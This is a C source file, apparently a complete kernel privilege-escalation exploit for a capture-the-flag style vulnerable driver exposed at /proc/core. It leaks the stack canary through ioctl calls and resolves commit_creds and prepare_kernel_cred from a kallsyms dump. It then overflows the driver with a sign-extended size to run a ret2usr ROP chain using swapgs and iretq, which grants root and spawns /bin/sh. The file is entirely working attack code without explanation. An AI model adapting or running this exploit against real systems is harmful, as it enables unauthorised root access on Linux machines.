#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

void get_shell(void){
    system("/bin/sh");
}

size_t commit_creds = 0, prepare_kernel_cred = 0;
size_t raw_vmlinux_base = 0xFFFFFFFF81000000;
size_t vmlinux_base = 0;
size_t find_symbols()
{
	FILE* kallsyms_fd = fopen("/tmp/kallsyms", "r");
	/* FILE* kallsyms_fd = fopen("./test_kallsyms", "r"); */

	if(kallsyms_fd < 0)
	{
		puts("[*]open kallsyms error!");
		exit(0);
	}

	char buf[0x30] = {0};
	while(fgets(buf, 0x30, kallsyms_fd))
	{
		if(commit_creds & prepare_kernel_cred)
			return 0;

		if(strstr(buf, "commit_creds") && !commit_creds)
		{
			char hex[20] = {0};
			strncpy(hex, buf, 16);
			sscanf(hex, "%llx", &commit_creds);
			printf("commit_creds addr: %p\n", commit_creds);
			vmlinux_base = commit_creds - 0x9C8E0;
			printf("vmlinux_base addr: %p\n", vmlinux_base);
		}

		if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)
		{
			char hex[20] = {0};
			strncpy(hex, buf, 16);
			sscanf(hex, "%llx", &prepare_kernel_cred);
			printf("prepare_kernel_cred addr: %p\n", prepare_kernel_cred);
			vmlinux_base = prepare_kernel_cred - 0x9CCE0;
		}
	}

	if(!(prepare_kernel_cred & commit_creds))
	{
		puts("[*]Error!");
		exit(0);
	}

}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
	__asm__("mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_sp, rsp;"
			"pushf;"
			"pop user_rflags;"
			);
	puts("[*]status has been saved.");
}

void get_root()
{
	char* (*pkc)(int) = prepare_kernel_cred;
	void (*cc)(char*) = commit_creds;
	(*cc)((*pkc)(0));
}

void set_off(int fd, long long idx)
{
	printf("[*]set off to %ld\n", idx);
	ioctl(fd, 0x6677889C, idx);
}

void core_read(int fd, char *buf)
{
	puts("[*]read to buf.");
	ioctl(fd, 0x6677889B, buf);

}

void core_copy_func(int fd, long long size)
{
	printf("[*]copy from user with size: %ld\n", size);
	ioctl(fd, 0x6677889A, size);
}

int main()
{
	save_status();
	int fd = open("/proc/core", 2);
	if(fd < 0)
	{
		puts("[*]open /proc/core error!");
		exit(0);
	}
	
	find_symbols();
	ssize_t offset = vmlinux_base - raw_vmlinux_base;

	set_off(fd, 0x40);

	char buf[0x40] = {0};
	core_read(fd, buf);
	size_t canary = ((size_t *)buf)[0];
	printf("[+]canary: %p\n", canary);

	size_t rop[0x1000] = {0};

	rop[8] = canary; 
	rop[10] = (size_t)get_root;
	rop[11] = 0xFFFFFFFF81A012DA + offset; // swapgs; popfq; ret
	rop[12] = 0;
	rop[13] = 0xFFFFFFFF81050AC2 + offset; // iretq; ret; 

	rop[14] = (size_t)get_shell;			// rip 
	
	rop[15] = user_cs;						// cs
	rop[16] = user_rflags;					// rflags
	rop[17] = user_sp;						// rsp
	rop[18] = user_ss;						// ss

	puts("[*] DEBUG: ");
	getchar();
	write(fd, rop, 0x800);
	core_copy_func(fd, 0xFFFFFFFFFFFF0000 | (0x100));

	return 0;
}
